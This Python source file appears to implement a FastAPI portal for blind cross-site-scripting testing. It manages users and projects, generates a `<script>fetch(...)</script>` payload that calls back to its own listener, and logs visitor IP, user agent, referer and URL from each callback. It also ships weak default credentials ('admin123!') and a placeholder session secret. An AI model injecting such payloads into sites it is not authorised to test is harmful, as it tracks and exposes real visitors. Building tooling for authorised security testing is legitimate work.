import csv
import io
import os
import secrets
import threading
import time
from datetime import datetime
from urllib.parse import urlparse

import bleach
from dotenv import load_dotenv
from fastapi import Depends, FastAPI, Form, HTTPException, Request, status
from fastapi.responses import HTMLResponse, PlainTextResponse, RedirectResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from passlib.context import CryptContext
from sqlalchemy import and_, select
from sqlalchemy.orm import Session
from starlette.middleware.sessions import SessionMiddleware

from .database import Base, engine, get_db
from .models import Hit, Project, User

load_dotenv()

app = FastAPI(title="Internal Blind XSS Monitoring Portal")
app.add_middleware(
    SessionMiddleware,
    secret_key=os.getenv("SESSION_SECRET", "change-me-in-production"),
    same_site="lax",
    https_only=bool(int(os.getenv("SESSION_HTTPS_ONLY", "0"))),
)

app.mount("/static", StaticFiles(directory="app/static"), name="static")
templates = Jinja2Templates(directory="app/templates")
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

RATE_LIMIT_BUCKET = {}
RATE_LIMIT_LOCK = threading.Lock()
RATE_LIMIT_WINDOW = int(os.getenv("RATE_LIMIT_WINDOW_SECONDS", "60"))
RATE_LIMIT_MAX = int(os.getenv("RATE_LIMIT_MAX_REQUESTS", "30"))


def sanitize_text(value: str, max_len: int) -> str:
    cleaned = bleach.clean(value or "", tags=[], attributes={}, strip=True)
    return cleaned.strip()[:max_len]


def sanitize_url(value: str, max_len: int = 500) -> str:
    value = sanitize_text(value, max_len)
    parsed = urlparse(value)
    if parsed.scheme not in {"http", "https"}:
        raise HTTPException(status_code=400, detail="Only HTTP/HTTPS URLs are allowed")
    if not parsed.netloc:
        raise HTTPException(status_code=400, detail="Invalid URL")
    return value


def now_ts() -> int:
    return int(time.time())


def check_rate_limit(client_key: str) -> bool:
    current = now_ts()
    with RATE_LIMIT_LOCK:
        data = RATE_LIMIT_BUCKET.get(client_key, [])
        data = [t for t in data if current - t < RATE_LIMIT_WINDOW]
        if len(data) >= RATE_LIMIT_MAX:
            RATE_LIMIT_BUCKET[client_key] = data
            return False
        data.append(current)
        RATE_LIMIT_BUCKET[client_key] = data
        return True


def get_current_user(request: Request, db: Session) -> User | None:
    user_id = request.session.get("user_id")
    if not user_id:
        return None
    return db.get(User, user_id)


def require_user(request: Request, db: Session = Depends(get_db)) -> User:
    user = get_current_user(request, db)
    if not user:
        raise HTTPException(status_code=status.HTTP_303_SEE_OTHER, headers={"Location": "/login"})
    return user


def require_admin(user: User = Depends(require_user)) -> User:
    if user.role != "admin":
        raise HTTPException(status_code=403, detail="Admin only")
    return user


def get_csrf_token(request: Request) -> str:
    token = request.session.get("csrf_token")
    if not token:
        token = secrets.token_urlsafe(32)
        request.session["csrf_token"] = token
    return token


def verify_csrf(request: Request, token: str):
    session_token = request.session.get("csrf_token")
    if not session_token or not secrets.compare_digest(session_token, token):
        raise HTTPException(status_code=400, detail="Invalid CSRF token")


def build_listener_url(request: Request, project_id: int) -> str:
    return str(request.base_url).rstrip("/") + f"/xss/{project_id}"


@app.on_event("startup")
def startup_event():
    Base.metadata.create_all(bind=engine)
    db = next(get_db())
    try:
        if not db.scalar(select(User).limit(1)):
            username = os.getenv("ADMIN_USERNAME", "admin")
            password = os.getenv("ADMIN_PASSWORD", "admin123!")
            db.add(User(username=username, password_hash=pwd_context.hash(password), role="admin"))
            db.commit()
    finally:
        db.close()


@app.get("/", response_class=HTMLResponse)
def index(request: Request, db: Session = Depends(get_db)):
    user = get_current_user(request, db)
    if not user:
        return RedirectResponse("/login", status_code=303)
    return RedirectResponse("/projects", status_code=303)


@app.get("/login", response_class=HTMLResponse)
def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request, "csrf_token": get_csrf_token(request)})


@app.post("/login")
def login(request: Request, username: str = Form(...), password: str = Form(...), csrf_token: str = Form(...), db: Session = Depends(get_db)):
    verify_csrf(request, csrf_token)
    username = sanitize_text(username, 50)
    user = db.scalar(select(User).where(User.username == username))
    if not user or not pwd_context.verify(password, user.password_hash):
        return templates.TemplateResponse("login.html", {"request": request, "csrf_token": get_csrf_token(request), "error": "Invalid credentials"}, status_code=401)
    request.session["user_id"] = user.id
    return RedirectResponse("/projects", status_code=303)


@app.post("/logout")
def logout(request: Request, csrf_token: str = Form(...)):
    verify_csrf(request, csrf_token)
    request.session.clear()
    return RedirectResponse("/login", status_code=303)


@app.get("/users/register", response_class=HTMLResponse)
def register_page(request: Request, admin: User = Depends(require_admin)):
    return templates.TemplateResponse("register.html", {"request": request, "user": admin, "csrf_token": get_csrf_token(request)})


@app.post("/users/register")
def register_user(
    request: Request,
    username: str = Form(...),
    password: str = Form(...),
    role: str = Form(...),
    csrf_token: str = Form(...),
    admin: User = Depends(require_admin),
    db: Session = Depends(get_db),
):
    verify_csrf(request, csrf_token)
    username = sanitize_text(username, 50)
    if role not in {"admin", "tester"}:
        raise HTTPException(status_code=400, detail="Invalid role")
    if len(password) < 10:
        raise HTTPException(status_code=400, detail="Password must be at least 10 characters")
    if db.scalar(select(User).where(User.username == username)):
        raise HTTPException(status_code=400, detail="Username already exists")
    db.add(User(username=username, password_hash=pwd_context.hash(password), role=role))
    db.commit()
    return RedirectResponse("/projects", status_code=303)


@app.get("/projects", response_class=HTMLResponse)
def list_projects(request: Request, user: User = Depends(require_user), db: Session = Depends(get_db)):
    if user.role == "admin":
        projects = db.scalars(select(Project).order_by(Project.created_at.desc())).all()
    else:
        projects = db.scalars(select(Project).where(Project.owner_id == user.id).order_by(Project.created_at.desc())).all()
    return templates.TemplateResponse("projects.html", {"request": request, "projects": projects, "user": user, "listener_base": str(request.base_url).rstrip('/'), "csrf_token": get_csrf_token(request)})


@app.get("/projects/new", response_class=HTMLResponse)
def new_project_page(request: Request, user: User = Depends(require_user)):
    return templates.TemplateResponse("project_new.html", {"request": request, "user": user, "csrf_token": get_csrf_token(request)})


@app.post("/projects")
def create_project(
    request: Request,
    name: str = Form(...),
    target_url: str = Form(...),
    notes: str = Form(""),
    csrf_token: str = Form(...),
    user: User = Depends(require_user),
    db: Session = Depends(get_db),
):
    verify_csrf(request, csrf_token)
    name = sanitize_text(name, 120)
    notes = sanitize_text(notes, 4000)
    target_url = sanitize_url(target_url)
    project = Project(name=name, target_url=target_url, notes=notes, owner_id=user.id)
    db.add(project)
    db.commit()
    return RedirectResponse(f"/projects/{project.id}", status_code=303)


@app.get("/projects/{project_id}", response_class=HTMLResponse)
def project_detail(request: Request, project_id: int, user: User = Depends(require_user), db: Session = Depends(get_db)):
    project = db.get(Project, project_id)
    if not project:
        raise HTTPException(status_code=404, detail="Project not found")
    if user.role != "admin" and project.owner_id != user.id:
        raise HTTPException(status_code=403, detail="Forbidden")
    payload = f"<script>fetch('{build_listener_url(request, project.id)}?tag=default-test',{{method:'GET',mode:'no-cors'}});</script>"
    return templates.TemplateResponse("project_detail.html", {"request": request, "project": project, "user": user, "payload": payload, "listener_url": build_listener_url(request, project.id), "csrf_token": get_csrf_token(request)})


@app.get("/xss/{project_id}")
def xss_listener(request: Request, project_id: int, tag: str = "", db: Session = Depends(get_db)):
    project = db.get(Project, project_id)
    if not project:
        raise HTTPException(status_code=404, detail="Project not found")

    client_ip = request.client.host if request.client else "unknown"
    rl_key = f"{client_ip}:{project_id}"
    if not check_rate_limit(rl_key):
        raise HTTPException(status_code=429, detail="Rate limit exceeded")

    hit = Hit(
        project_id=project_id,
        ip_address=sanitize_text(client_ip, 100),
        user_agent=sanitize_text(request.headers.get("user-agent", ""), 1000),
        referer=sanitize_text(request.headers.get("referer", ""), 1000),
        full_url=sanitize_text(str(request.url), 2000),
        custom_tag=sanitize_text(tag, 120),
    )
    db.add(hit)
    db.commit()
    return PlainTextResponse("ok", status_code=200)


@app.get("/hits", response_class=HTMLResponse)
def hits_page(
    request: Request,
    project_id: int | None = None,
    from_date: str | None = None,
    to_date: str | None = None,
    user: User = Depends(require_user),
    db: Session = Depends(get_db),
):
    conditions = []
    if user.role != "admin":
        conditions.append(Project.owner_id == user.id)
    if project_id:
        conditions.append(Hit.project_id == project_id)

    if from_date:
        conditions.append(Hit.timestamp >= datetime.fromisoformat(from_date))
    if to_date:
        conditions.append(Hit.timestamp <= datetime.fromisoformat(to_date + "T23:59:59"))

    stmt = select(Hit, Project).join(Project, Hit.project_id == Project.id)
    if conditions:
        stmt = stmt.where(and_(*conditions))
    rows = db.execute(stmt.order_by(Hit.timestamp.desc())).all()

    projects = db.scalars(select(Project).where(Project.owner_id == user.id) if user.role != "admin" else select(Project)).all()
    return templates.TemplateResponse("hits.html", {"request": request, "rows": rows, "projects": projects, "selected_project": project_id, "from_date": from_date or "", "to_date": to_date or "", "user": user, "csrf_token": get_csrf_token(request)})


@app.get("/hits/{hit_id}", response_class=HTMLResponse)
def hit_detail(request: Request, hit_id: int, user: User = Depends(require_user), db: Session = Depends(get_db)):
    row = db.execute(select(Hit, Project).join(Project, Hit.project_id == Project.id).where(Hit.id == hit_id)).first()
    if not row:
        raise HTTPException(status_code=404, detail="Hit not found")
    hit, project = row
    if user.role != "admin" and project.owner_id != user.id:
        raise HTTPException(status_code=403, detail="Forbidden")
    return templates.TemplateResponse("hit_detail.html", {"request": request, "hit": hit, "project": project, "user": user, "csrf_token": get_csrf_token(request)})


@app.get("/hits/export.csv")
def export_hits_csv(request: Request, project_id: int | None = None, user: User = Depends(require_user), db: Session = Depends(get_db)):
    stmt = select(Hit, Project).join(Project, Hit.project_id == Project.id)
    if user.role != "admin":
        stmt = stmt.where(Project.owner_id == user.id)
    if project_id:
        stmt = stmt.where(Hit.project_id == project_id)
    rows = db.execute(stmt.order_by(Hit.timestamp.desc())).all()

    buffer = io.StringIO()
    writer = csv.writer(buffer)
    writer.writerow(["hit_id", "timestamp", "project_id", "project_name", "ip_address", "user_agent", "referer", "full_url", "custom_tag"])
    for hit, project in rows:
        writer.writerow([hit.id, hit.timestamp.isoformat(), project.id, project.name, hit.ip_address, hit.user_agent, hit.referer, hit.full_url, hit.custom_tag])
    return Response(content=buffer.getvalue(), media_type="text/csv", headers={"Content-Disposition": "attachment; filename=hits.csv"})


@app.get("/reports/{project_id}", response_class=HTMLResponse)
def vulnerability_report(request: Request, project_id: int, user: User = Depends(require_user), db: Session = Depends(get_db)):
    project = db.get(Project, project_id)
    if not project:
        raise HTTPException(status_code=404, detail="Project not found")
    if user.role != "admin" and project.owner_id != user.id:
        raise HTTPException(status_code=403, detail="Forbidden")
    hits = db.scalars(select(Hit).where(Hit.project_id == project_id).order_by(Hit.timestamp.desc()).limit(20)).all()
    return templates.TemplateResponse("report.html", {"request": request, "project": project, "hits": hits, "user": user, "csrf_token": get_csrf_token(request)})
